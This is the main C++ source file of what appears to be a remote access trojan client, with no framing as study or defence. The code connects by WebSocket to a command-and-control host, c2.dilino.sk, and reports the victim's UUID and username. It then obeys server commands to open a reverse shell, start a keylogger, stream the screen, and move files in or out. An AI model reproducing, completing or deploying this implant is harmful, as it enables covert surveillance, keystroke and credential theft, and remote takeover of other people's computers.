#include "./src/websocket_client.hpp"
#include "./src/user_info.hpp"
#include "./src/file_transfer.hpp"
#include "./src/keylogger.hpp"
#include "./src/reverse_shell.hpp"
#include "./src/screenshare.hpp"

#include <nlohmann/json.hpp>
#include <iostream>
#include <string>
#include <map>
#include <chrono>

struct Seeker {
    std::string ID;
    std::string Name;
    std::string OS;
    std::map<std::string, std::string> Metadata;

    nlohmann::json to_json() const {
        nlohmann::json j;
        j["id"] = ID;
        j["name"] = Name;
        j["os"] = OS;
        j["metadata"] = Metadata;
        return j;
    }
};

int main() {
    WebSocketClient client("c2.dilino.sk", 8010, "/ws/seeker");
    KeyLogger keylogger(client);
    Shell shell(client);
    ScreenShare screenshare(client);

    client.setMessageCallback([&client, &keylogger, &shell, &screenshare](const std::string& message, size_t len) {
        std::cout << "[Server] " << message << std::endl;

        try {
            nlohmann::json data = nlohmann::json::parse(message);
            std::string msg_type = data.value("type", "");
            std::string msg_data = data.value("data", "");

            std::cout << msg_type << std::endl;
            if (msg_type == "shell_command") {
                if (msg_data == "start") {
                    shell.startShell();
                }
                else if (msg_data == "stop") {
                    shell.stopShell();
                }
                else {
                    nlohmann::json response;
                    response["type"] = "shell_output";
                    response["data"] = "[Info] Unknown shell_command: " + msg_data;
                    client.sendMessage(response.dump());
                }
            }
            else if (msg_type == "shell_input") {
                shell.writeShellInput(msg_data);
            }
            else if (msg_type == "screenshare_command") {
                if (msg_data == "start") {
                    screenshare.start_screenshare();
                }
                else if (msg_data == "stop") {
                    screenshare.stop_screenshare();
                }
                else {
                    nlohmann::json response;
                    response["type"] = "screenshare_output";
                    response["data"] = "[Info] Unknown screenshare_command: " + msg_data;
                    client.sendMessage(response.dump());
                }
            }
            else if (msg_type == "keylogger_command") {
                if (msg_data == "start") {
                    keylogger.start();
                    nlohmann::json response;
                    response["type"] = "keylogger_output";
                    response["data"] = "[Info] Keylogger started";
                    client.sendMessage(response.dump());
                }
                else if (msg_data == "stop") {
                    keylogger.stop();
                    nlohmann::json response;
                    response["type"] = "keylogger_output";
                    response["data"] = "[Info] Keylogger stopped";
                    client.sendMessage(response.dump());
                }
                else {
                    nlohmann::json response;
                    response["type"] = "keylogger_output";
                    response["data"] = "[Info] Unknown keylogger_command: " + msg_data;
                    client.sendMessage(response.dump());
                }
            }
            else if (msg_type == "file_upload") {
                try {
                    nlohmann::json file_data = nlohmann::json::parse(msg_data);
                    std::string result = file_transfer::save_file(file_data);
                    nlohmann::json response;
                    response["type"] = "file_transfer_output";
                    response["data"] = result;
                    client.sendMessage(response.dump());
                }
                catch (const std::exception& e) {
                    nlohmann::json response;
                    response["type"] = "file_transfer_output";
                    response["data"] = "[Error] Failed to process file upload: " + std::string(e.what());
                    client.sendMessage(response.dump());
                }
            }
            else if (msg_type == "file_download") {
                try {
                    std::string result = file_transfer::send_file(msg_data);
                    nlohmann::json response;
                    response["type"] = "file_download_response";
                    response["data"] = result;
                    client.sendMessage(response.dump());
                }
                catch (const std::exception& e) {
                    nlohmann::json response;
                    response["type"] = "file_transfer_output";
                    response["data"] = "[Error] Failed to process file download: " + std::string(e.what());
                    client.sendMessage(response.dump());
                }
            }
            else if (msg_type == "notification") {
                // TODO: Parse msg_data as JSON to extract notification message and title
                // Display a system notification with the provided message and title
            }
            else if (msg_type == "Disconnect") {
                // TODO: Handle server-initiated disconnect
                // Close the WebSocket connection and prevent reconnection
                std::cout << "[Info] Received server-initiated disconnect: " << msg_data << std::endl;
                client.stop();
            }
            else {
                // TODO: Handle unknown message types
                std::cout << "[Info] Unknown message type: " << msg_type << std::endl;
            }
        }
        catch (const nlohmann::json::exception& e) {
            // TODO: Handle JSON parsing errors
            std::cerr << "[Error] Failed to decode server message: " << e.what() << std::endl;
        }
        });

    client.setEventCallback([&client](enum lws_callback_reasons reason) {
        if (reason == LWS_CALLBACK_CLIENT_ESTABLISHED) {
            std::cout << "Connected to server" << std::endl;

            // Create and populate Seeker struct
            Seeker seeker;
            seeker.ID = user_info::getUUID();
            seeker.Name = user_info::getUsername();
            seeker.OS = "Windows";

            nlohmann::json json = seeker.to_json();
            std::string json_str = json.dump();

            if (!client.sendMessage(json_str)) {
                std::cerr << "Failed to send initial Seeker data" << std::endl;
            }
            else {
                std::cout << "Sent initial Seeker data: " << json_str << std::endl;
            }
        }
        else if (reason == LWS_CALLBACK_CLIENT_CLOSED) {
            std::cout << "Connection closed" << std::endl;
        }
        });

    if (!client.initialize()) {
        std::cerr << "Initialization failed" << std::endl;
        return -1;
    }
    if (!client.connect()) {
        std::cerr << "Connection failed" << std::endl;
        return -1;
    }

    client.run();

    std::cout << "Client stopped" << std::endl;
    return 0;
}